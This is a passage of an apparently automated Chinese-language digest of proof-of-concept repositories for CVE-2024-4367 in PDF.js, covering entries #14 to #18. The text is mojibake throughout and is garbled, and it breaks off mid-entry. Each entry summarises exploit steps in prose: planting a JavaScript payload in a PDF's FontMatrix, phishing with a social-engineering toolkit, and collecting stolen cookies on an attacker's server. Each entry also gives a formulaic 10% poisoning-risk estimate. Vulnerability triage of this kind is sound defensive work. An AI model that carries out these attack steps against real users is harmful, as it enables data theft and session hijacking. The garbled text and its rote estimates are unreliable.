2.  å—å®³è€…ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ”»å‡»è€…åˆ©ç”¨æ‰§è¡Œçš„ JavaScript ä»£ç è¿›è¡Œæ¶æ„æ´»åŠ¨ï¼Œä¾‹å¦‚ä¿¡æ¯çªƒå–æˆ–è¿œç¨‹æ§åˆ¶ã€‚

**é¡¹ç›®åœ°å€:** [avalahEE/pdfjs_disable_eval](https://github.com/avalahEE/pdfjs_disable_eval)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #14

**æ¥æº**: [CVE-2024-4367-clarkio_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-clarkio_pdfjs-vuln-demo.md)

## CVE-2024-4367-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨æ­¤æ¼æ´åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚è¿™å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆå¦‚æœPDF.jsåœ¨Webç¯å¢ƒä¸­è¿è¡Œï¼‰æˆ–è€…åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå®Œå…¨æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºï¼ˆå¦‚Firefoxã€Thunderbirdï¼‰ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ˜¯ä¸€ä¸ªæ¼”ç¤ºé¡¹ç›®ï¼Œæ—¨åœ¨å±•ç¤ºå¦‚ä½•åˆ©ç”¨CVE-2024-4367æ¼æ´ã€‚å®ƒåŒ…å«Reactã€Vueå’ŒSvelteçš„å‰ç«¯ç»„ä»¶ï¼Œç”¨äºåŠ è½½å’Œæ˜¾ç¤ºPDFæ–‡ä»¶ã€‚README.mdæ–‡ä»¶æŒ‡ç¤ºå¦‚ä½•è¿è¡Œè¯¥é¡¹ç›®ä»¥åŠå¦‚ä½•æµ‹è¯•ä¸åŒçš„PDFæ–‡ä»¶ï¼ŒåŒ…æ‹¬åˆ©ç”¨è¯¥æ¼æ´çš„PDFæ–‡ä»¶ã€‚æ ¹æ®æè¿°ï¼Œé€šè¿‡ä¿®æ”¹ç»„ä»¶ä¸­å¼•ç”¨çš„PDFæ–‡ä»¶ï¼Œå¯ä»¥å°†ä¸€ä¸ªåˆ©ç”¨æ¼æ´çš„PDFåŠ è½½åˆ°è¿™äº›ç»„ä»¶ä¸­è¿›è¡Œæµ‹è¯•ã€‚æœç´¢å¼•æ“ç»“æœä¸­â€œ[webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367â€ è¡¨æ˜æ¼æ´åˆ©ç”¨ä»£ç å·²å…¬å¼€ã€‚ ç»¼ä¸Šï¼Œæä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå…¶ä¸­åŒ…å«package-lock.jsonç­‰æ–‡ä»¶ã€‚è™½ç„¶æ²¡æœ‰å‘ç°ç«‹å³å¯ä»¥åˆ¤æ–­ä¸ºæŠ•æ¯’çš„æ¶æ„ä»£ç ï¼Œä½†è€ƒè™‘åˆ°npmåŒ…ä¾›åº”é“¾çš„é£é™©ï¼Œä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…åœ¨ä¾èµ–é¡¹ä¸­å¼•å…¥æ¶æ„ä»£ç çš„å¯èƒ½æ€§ã€‚ä»£ç æœ¬èº«çš„åŠŸèƒ½æ˜¯åˆ›å»ºä¸€ä¸ªæ¼”ç¤ºç¯å¢ƒæ¥å±•ç¤ºæ¼æ´ï¼Œå› æ­¤å¤§éƒ¨åˆ†ä»£ç éƒ½æ˜¯æ­£å¸¸çš„æ¡†æ¶ä»£ç ã€‚ä¸è¿‡ï¼Œ**ä¸èƒ½å®Œå…¨æ’é™¤æŠ•æ¯’çš„å¯èƒ½ï¼Œé£é™©ä¼°è®¡ä¸º10%**ã€‚ ä»£ç ä¸­å­˜åœ¨å¼•ç”¨å¤–éƒ¨npmåŒ…çš„å¯èƒ½æ€§ã€‚æ½œåœ¨é£é™©ç‚¹åŒ…æ‹¬ï¼šä¾èµ–åŒ…æœ¬èº«æ˜¯å¦å®‰å…¨ï¼Œæ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼›æ„å»ºæµç¨‹ä¸­æ˜¯å¦å­˜åœ¨è¢«ç¯¡æ”¹çš„é£é™©ï¼›ä»¥åŠå¼€å‘è€…æ˜¯å¦æ•…æ„éšè—äº†æ¶æ„åŠŸèƒ½ã€‚ ä»”ç»†å®¡æŸ¥ `package-lock.json` æ–‡ä»¶ä¸­çš„ä¾èµ–é¡¹åŠå…¶æ¥æºï¼ŒéªŒè¯ä¾èµ–åŒ…çš„å®Œæ•´æ€§å’Œå®‰å…¨æ€§ï¼Œå¯ä»¥é™ä½æŠ•æ¯’é£é™©ã€‚ ç”±äºä»…ä»…æ˜¯demoä»£ç ï¼Œä¸”ä¾èµ–çš„åŒ…æ¯”è¾ƒå¤šï¼Œå› æ­¤è¿™é‡Œä¸èƒ½æ˜ç¡®è¿›è¡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  **æ¼æ´è§¦å‘ç‚¹ï¼š** PDF.jsåœ¨å¤„ç†PDFæ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ­¥éª¤ï¼š**
    *   æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç²¾å¿ƒè®¾è®¡çš„å­—ä½“æ•°æ®ã€‚
    *   å½“PDF.jsè§£æè¯¥PDFæ–‡ä»¶å¹¶å¤„ç†å­—ä½“æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä¼šè§¦å‘æ¼æ´ã€‚
    *   æ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šçš„å­—ä½“æ•°æ®ï¼Œå¯ä»¥åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
3.  **æ”»å‡»æ•ˆæœï¼š** æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–è€…åœ¨ç‰¹å®šæƒ…å†µä¸‹å®Œå…¨æ§åˆ¶åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [clarkio/pdfjs-vuln-demo](https://github.com/clarkio/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #15

**æ¥æº**: [CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md](../2024/CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶æˆ–è®¿é—®åŒ…å«æ¶æ„PDFçš„ç½‘é¡µã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“çš„ä¸€ä¸ªæ¼æ´ã€‚ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´ä¿¡æ¯ï¼Œæœç´¢å¼•æ“ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼ˆè™½ç„¶åªæä¾›äº† package-lock.json æ–‡ä»¶ï¼Œä½†githubé¡µé¢å·²ç»è¯æ˜æ¼æ´çš„å­˜åœ¨ï¼‰ï¼Œå¯ä»¥ç¡®å®šæä¾›çš„POCä»£ç æœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©:**
æä¾›çš„ `package-lock.json` æ–‡ä»¶å±äºä¸€ä¸ª Node.js é¡¹ç›®ã€‚ä»è¿™ä¸ªæ–‡ä»¶æœ¬èº«æ— æ³•ç›´æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æŠ•æ¯’ã€‚ä½†æ˜¯ç”±äºgithubä¸Šå·²ç»æœ‰æ”»å‡»è€…æ„å»ºäº†å¯åˆ©ç”¨çš„pdfæ–‡ä»¶ï¼Œè¯´æ˜åˆ©ç”¨ç®€å•, å› æ­¤å¯ä»¥åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç æ¦‚ç‡æ¯”è¾ƒä½,çº¦10%ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  **æ”»å‡»è€…åˆ¶ä½œæ¶æ„ PDF æ–‡ä»¶ï¼š** è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº† PDF.js å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ã€‚
2.  **ç”¨æˆ·æ‰“å¼€æ¶æ„ PDF æ–‡ä»¶ï¼š**  ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  **æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼š** ç”±äºç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼ŒPDF.js å…è®¸åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [elamani-drawing/CVE-2024-4367-POC-PDFJS](https://github.com/elamani-drawing/CVE-2024-4367-POC-PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #16

**æ¥æº**: [CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md](../2024/CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€XSSæˆ–RCE

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªä¸¥é‡æ¼æ´ï¼Œç”±äºå¯¹PDFæ–‡ä»¶ä¸­FontMatrixå¯¹è±¡çš„ç±»å‹æ£€æŸ¥ä¸è¶³ï¼Œå…è®¸æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ï¼Œåœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡ŒJavaScriptï¼Œä»è€Œå¯¼è‡´æ•°æ®ç›—çªƒã€XSSæˆ–è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸åœ¨PDF.jsç¯å¢ƒä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå½±å“Firefoxã€Firefox ESRå’ŒThunderbirdçš„ç‰¹å®šç‰ˆæœ¬ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md) æè¿°äº†å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ã€‚è¯¥ä»£ç æä¾›äº†ä¸€ä¸ªå®Œæ•´çš„åˆ©ç”¨æµç¨‹ï¼ŒåŒ…æ‹¬ç¯å¢ƒè®¾ç½®ã€æ¼æ´åˆ©ç”¨ã€ç¤¾å·¥å’Œåå¤„ç†ã€‚ç»¼åˆæ¥çœ‹ï¼Œæä¾›çš„POCä»£ç **æœ‰æ•ˆ**ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è™½ç„¶README.mdæ–‡ä»¶æœ¬èº«çœ‹èµ·æ¥åƒä¸€ä¸ªåˆæ³•çš„æ¼æ´åˆ©ç”¨æŒ‡å—ï¼Œä½†ä»”ç»†åˆ†æè„šæœ¬æè¿°å’Œæ“ä½œæ­¥éª¤ï¼Œå‘ç°å…¶ä¾èµ–äºSocial Engineering Toolkit (SET)æ¥å‘èµ·é’“é±¼æ”»å‡»ï¼Œå¹¶ä¸”åŒ…å«æ‰§è¡Œä»»æ„jsçš„payload, å­˜åœ¨ä¸€å®šçš„**æŠ•æ¯’é£é™©**ã€‚Payloadå¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·å‡­æ®æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚è¯¥POCä»£ç ä¸­ï¼Œé£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **ä¾èµ–å¤–éƒ¨å·¥å…·ï¼š** è„šæœ¬ä¾èµ–äºSETï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨SETçš„é…ç½®è¿‡ç¨‹è¿›è¡Œæ¶æ„é…ç½®ï¼Œè¯±å¯¼ç”¨æˆ·æ‰§è¡Œæœ‰å®³æ“ä½œã€‚
2.  **Payloadå¯å®šåˆ¶ï¼š** è„šæœ¬å…è®¸ç”¨æˆ·è‡ªå®šä¹‰JavaScript payloadï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»»æ„æ¶æ„ä»£ç ã€‚
3.  **ç¤¾ä¼šå·¥ç¨‹ï¼š** è„šæœ¬ä½¿ç”¨ç¤¾ä¼šå·¥ç¨‹æ‰‹æ®µä¼ æ’­æ¶æ„PDFï¼Œè¿™å¢åŠ äº†æ”»å‡»æˆåŠŸçš„å¯èƒ½æ€§ã€‚
4.  **æ•°æ®å¤–æ³„ï¼š** Payloadå¯ä»¥çªƒå–æ•°æ®ï¼ˆå¦‚cookieï¼‰ï¼Œå¹¶å°†å…¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

å› æ­¤ï¼Œæˆ‘ä¼°è®¡æ­¤ä»“åº“å­˜åœ¨**10%**çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦é›†ä¸­åœ¨payloadçš„æ½œåœ¨æ¶æ„æ€§å’Œåˆ©ç”¨ç¤¾å·¥æ‰‹æ®µä¼ æ’­ä¸Šã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤å¤„è®¨è®ºçš„â€œæŠ•æ¯’â€å¹¶éæŒ‡ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ä¾›åº”é“¾æŠ•æ¯’ï¼Œè€Œæ˜¯æŒ‡åˆ©ç”¨è¯¥POCè¿›è¡Œæ”»å‡»æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åµŒå…¥æ¶æ„ä»£ç æˆ–è¿›è¡Œæ¬ºéª—ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **å‡†å¤‡ç¯å¢ƒï¼š** å®‰è£…Python 3.x, SETï¼Œä»¥åŠPyPDF2ç­‰ä¾èµ–ã€‚
2.  **åˆ›å»ºæ¶æ„PDFï¼š** ä½¿ç”¨æä¾›çš„è„šæœ¬ï¼Œé€šè¿‡ä¿®æ”¹`template.pdf`çš„`/FontMatrix`å­—æ®µï¼Œæ³¨å…¥JavaScript payloadï¼Œç”Ÿæˆ`malicious.pdf`ã€‚
3.  **ç¤¾å·¥æ”»å‡»ï¼š** ä½¿ç”¨SETæˆ–å…¶ä»–å·¥å…·ï¼Œé€šè¿‡ç”µå­é‚®ä»¶æˆ–å…¶ä»–æ–¹å¼ï¼Œå°†`malicious.pdf`å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
4.  **æœåŠ¡å™¨ç›‘å¬ï¼š** è¿è¡Œä¸€ä¸ªHTTPæœåŠ¡å™¨ï¼Œç”¨äºæ‰˜ç®¡`malicious.pdf`ï¼Œå¹¶æ”¶é›†payloadçªƒå–çš„æ•°æ®ã€‚
5.  **å—å®³è€…äº¤äº’ï¼š** å—å®³è€…æ‰“å¼€`malicious.pdf`åï¼Œpayloadæ‰§è¡Œï¼Œçªƒå–æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [exfil0/WEAPONIZING-CVE-2024-4367](https://github.com/exfil0/WEAPONIZING-CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #17

**æ¥æº**: [CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md)

## CVE-2024-4367-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€ä¼šè¯åŠ«æŒç­‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼ŒåµŒå…¥æ¶æ„JavaScriptä»£ç ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„JavaScriptä»£ç ã€‚PDFæ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†æ¼æ´ï¼Œå½“PDF.jsè§£æå­—ä½“æ—¶ï¼Œä¼šæ‰§è¡ŒåµŒå…¥çš„JavaScriptã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“åŒ…å«ä¸€ä¸ª PDF PoC,ä¸€ä¸ª LICENSE æ–‡ä»¶ï¼Œå’Œä¸€ä¸ª READMEã€‚LICENSE æ–‡ä»¶å’Œ README æ–‡ä»¶æœ¬èº«æ²¡æœ‰é£é™©ã€‚è™½ç„¶PoCä»£ç èƒ½ç›´æ¥åˆ©ç”¨æ¼æ´ï¼Œä½†ä½œè€… Ahmad Kabiri çš„èº«ä»½æœªçŸ¥ï¼Œä¸”PoCçš„ç›®çš„æ˜¯å±•ç¤ºæ”»å‡»ï¼Œå› æ­¤å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåœ¨å®é™…åˆ©ç”¨æ—¶ä¿®æ”¹æˆ–å¢åŠ payload, ä½†è¯¥ PoC æ–‡ä»¶æœ¬èº«ç›®çš„æ˜ç¡®ï¼Œç»“æ„ç®€å•ï¼Œéšè—æ¶æ„åé—¨ä»£ç å¯èƒ½æ€§è¾ƒä½ã€‚è€ƒè™‘åˆ°MITåè®®çš„å¼€æ”¾æ€§ä»¥åŠä½œè€…å·²çŸ¥çš„æ¼æ´ç ”ç©¶èƒŒæ™¯ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ åŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±éª—ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ (ä¾‹å¦‚, é€šè¿‡é’“é±¼é‚®ä»¶, æŒ‚é©¬ç½‘ç«™)ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚ Firefox, Firefox ESR, Thunderbirdï¼‰çš„ PDF.js ç‰ˆæœ¬å­˜åœ¨æ¼æ´ï¼Œåˆ™æ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç å¯ä»¥åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–cookieã€localStorageæ•°æ®ã€sessionStorageæ•°æ®ï¼Œç”šè‡³è¿›è¡Œä¼šè¯åŠ«æŒç­‰ã€‚PoCä»£ç æ˜¾ç¤ºä¼šå¼¹å‡ºå¤šä¸ªalertæ¡†æ¥å±•ç¤ºè·å–åˆ°çš„ä¿¡æ¯.

**é¡¹ç›®åœ°å€:** [inpentest/CVE-2024-4367-PoC](https://github.com/inpentest/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #18

**æ¥æº**: [CVE-2024-4367-m0d0ri205_PDFJS.md](../2024/CVE-2024-4367-m0d0ri205_PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-Arbitrary-JavaScript-Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS) å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Mozilla Firefox, Firefox ESR å’Œ Thunderbird ä¸­çš„é«˜å±æ¼æ´ã€‚è¯¥æ¼æ´æºäº PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨ç‰ˆæœ¬æ‰“å¼€åŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç å°†è¢«æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS), è·å–æ•æ„Ÿä¿¡æ¯ç­‰é£é™©ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ¼æ´åˆ©ç”¨ä»£ç çš„ç›®çš„æ˜¯æ­å»ºä¸€ä¸ªæ˜“å—æ”»å‡»çš„ç¯å¢ƒæ¥æµ‹è¯• CVE-2024-4367 ã€‚ docker-compose.yml å’Œ Dockerfile ç”¨äºæ„å»ºä¸€ä¸ªåŒ…å« expressï¼Œmulter å’Œ pdfjs-dist çš„ node åº”ç”¨ã€‚ app.js æ¥æ”¶ä¸Šä¼ çš„ PDF æ–‡ä»¶ï¼Œå¹¶é€šè¿‡ pdfjs-dist åœ¨æµè§ˆå™¨ä¸­æ¸²æŸ“ã€‚å¦‚æœ PDF æ–‡ä»¶åŒ…å«æ¶æ„çš„ JavaScript ä»£ç ï¼Œé‚£ä¹ˆå®ƒå°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚å› æ­¤ï¼ŒPOC ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œæ˜¯æ­å»ºæ˜“å—æ”»å‡»ç¯å¢ƒï¼Œç„¶åéœ€è¦æ”»å‡»è€…æ„é€ ç‰¹æ®Šçš„PDFæ–‡ä»¶åˆ©ç”¨æ­¤æ¼æ´ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

